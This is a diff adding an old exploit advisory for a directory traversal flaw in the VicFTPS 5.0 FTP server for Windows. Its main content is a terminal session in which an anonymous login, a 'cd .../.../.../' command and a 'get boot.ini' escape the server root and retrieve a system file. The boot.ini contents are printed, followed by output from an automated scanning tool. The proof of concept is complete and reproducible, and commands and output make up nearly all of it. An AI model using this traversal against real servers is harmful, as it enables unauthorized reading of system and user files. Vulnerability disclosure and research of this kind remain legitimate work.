@@ -1,0 +1,88 @@
+################################################################################
+#
+# +------------------------------------------------------------------------+
+# |                                 .......                                |
+# |                         ..''xxxxxxxxxxxxxxx'...                        |
+# |                    ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx..                    |
+# |                 ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.                 |
+# |               .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'.               |
+# |             .'xxxxxxxxxxxxxxxxxxxxx''......        ...  ..             |
+# |            .xxxxxxxxxxxxxxxxxx'...         ........      .'.           |
+# |           'xxxxxxxxxxxxxxx'......                          '.          |
+# |          'xxxxxxxxxxxxxx'..'x..                            .x.         |
+# |         .xxxxxxxxxxxx'...'..                  ...           .'         |
+# |         'xxxxxxxxx'..  .                          ..        .x.        |
+# |         xxxxxxx'.                                  ..        x.        |
+# |         xxxx'.                ....                  x        x.        |
+# |         'x'.            ...'xxxxxxx'.               x       .x.        |
+# |         .x'.         .'xxxxxxxxxxxxxx.             ''       .'         |
+# |          .xx.      .'xxxxxxxxxxxxxxxx.           .'xx'''.  .'          |
+# |           .xx..    'xxxxxxxxxxxxxxxx'          .'xxxxxxxxx''.          |
+# |            .'xx'.  .'xxxxxxxxxxxxxxx.      ..'xxxxxxxxxxxx'            |
+# |              .xxx'.  .xxxxxxxxxxxx'.    .'xxxxxxxxxxxxxx'.             |
+# |                .xxxx'.'xxxxxxxxx'.      xxx'xxxxxxxxxx'.               |
+# |                  .'xxxxxxx'....          ...xxxxxxx'.                  |
+# |                     ..'xxxxx'..         ..xxxxx'..                     |
+# |                          ....'xx'.....''''...                          |
+# |                                                                        |
+# |                    CubilFelino Security Research Labs                  |
+# |                            proudly presents...                         |
+# +------------------------------------------------------------------------+
+#
+#                       VicFTPS v5.0 Directory Traversal
+#
+#
+# Greets: l1l1th, hkm, nitr0us, alt3kx, r1l0, b0rr3x, w01f, ax0us
+#         gh0st, CHiP, Jorge Mieres and ygjb.
+#
+################################################################################
+ 
+# Exploit Title: VicFTPS v5.0 Directory Traversal
+# Date: May 05, 2010
+# Author: chr1x
+# Description: A simple FTP server for Windows. Does not require an install. Very simple to configure. Supports only one user connection at a time. Supports active and passive mode transfers, MDTM, SIZE, and PASS. Version 5.0 fixed CWD Buffer overflow vulnerability. <- A new vuln here! :D
+# Version: 5.0
+# Tested on: Windows XP SP3 (Spanish Edition)
+
+#########<VULN CONFIRMATION>#########################################
+root@olovely:/ddpwn# ftp
+ftp> open
+(to) 192.168.1.64
+Connected to 192.168.1.64.
+220 VicFTPS ready
+Name (192.168.1.64:ninja): anonymous
+331 pretend login accepted
+Password:
+230 fake user logged in
+Remote system type is WIN32.
+ftp> ascii
+200 Type set to I
+ftp> cd .../.../.../
+250 CWD command successful
+ftp> pwd
+257 "/../../"
+ftp> get boot.ini
+local: boot.ini remote: boot.ini
+200 PORT command successful
+150 Opening BINARY mode data connection
+226 Transfer Complete
+211 bytes received in 0.00 secs (92.1 kB/s)
+ftp> bye
+221 goodbye
+
+root@olovely:/ddpwn# cat boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+root@olovely:/ddpwn#
+
+#########</VULN CONFIRMATION>#########################################
+
+Shot from DDPwNv1.0
+[*] Testing Path: .../.../.../  <- VULNERABLE! :P
+
+Thiz v00d00 t00l just r0x! Ninjutzu automated hacking babe! lol.
+
+http://chr1x.sectester.net
